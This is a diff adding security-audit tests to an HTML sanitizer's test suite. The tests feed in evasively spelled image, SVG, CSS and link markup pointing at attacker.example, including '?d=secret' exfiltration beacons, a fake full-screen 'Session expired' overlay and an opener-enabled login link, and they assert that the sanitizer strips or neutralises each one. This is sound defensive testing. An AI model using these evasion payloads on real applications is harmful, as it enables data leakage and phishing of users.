@@ -281,6 +281,40 @@ describe('render: sanitization', () => {
     expect(allowed.querySelector('img')?.getAttribute('src')).toBe('https://tracker.example/p.gif');
   });
 
+  it('blocks remote loads however the URL or CSS is spelled (security audit)', () => {
+    const text =
+      '<img src="https:\\\\attacker.example\\x?d=secret" alt="a">\n\n' +
+      '<img src="/\\attacker.example/x?d=secret" alt="b">\n\n' +
+      '<img src="Attachments/pic.png" srcset=",https://attacker.example/p 2x" alt="c">\n\n' +
+      '<video poster="https:\\\\attacker.example\\p.png"></video>\n\n' +
+      '<table background="/\\attacker.example/t.png"><tr><td>x</td></tr></table>\n\n' +
+      '<svg xmlns="http://www.w3.org/2000/svg"><image href="/\\attacker.example/i.png"></image><rect fill="url(https://attacker.example/s.svg#p)"></rect></svg>\n\n' +
+      '<div style="background-image:u\\rl(https://attacker.example/bg.png); color: red">x</div>';
+    const el = dom(text, ctx({ loadRemoteImages: false }));
+    const placeholders = [...el.querySelectorAll('.remote-image-placeholder')].map((p) => p.getAttribute('data-alt'));
+    expect(placeholders).toEqual(['a', 'b']);
+    for (const node of el.querySelectorAll('*')) {
+      for (const attr of node.attributes) {
+        if (attr.name === 'data-src') continue;
+        expect(attr.value, `${node.localName} ${attr.name}`).not.toContain('attacker.example');
+      }
+    }
+    expect(el.querySelector('img[alt="c"]')?.hasAttribute('srcset')).toBe(false);
+    expect(el.querySelector('div')?.getAttribute('style')).toBe('color: red');
+  });
+
+  it('keeps note HTML from drawing over the app, whatever spelling it uses (security audit)', () => {
+    const el = dom('<div style="--p:fixed;position:var(--p);inset:0;/**/z-index:2147483647;background:#fff">Session expired</div>\n\n<span style="p\\osition:fixed">y</span>');
+    expect(el.querySelector('div')!.getAttribute('style')).toBe('inset:0;background:#fff');
+    expect(el.querySelector('span')!.hasAttribute('style')).toBe(false);
+  });
+
+  it('opens links that resolve to another site in a new tab without an opener (security audit)', () => {
+    const a = dom('<a href="/\\attacker.example/login" target="_self" rel="opener">sign in</a>').querySelector('a')!;
+    expect(a.getAttribute('target')).toBe('_blank');
+    expect(a.getAttribute('rel')).toBe('noopener noreferrer');
+  });
+
   it('renders the tasks of a transcluded note disabled (FE-9, ux)', () => {
     const boxes = [...dom('- [ ] embedded task', ctx({ depth: 1 })).querySelectorAll('input.task-list-item-checkbox')] as HTMLInputElement[];
     expect(boxes).toHaveLength(1);
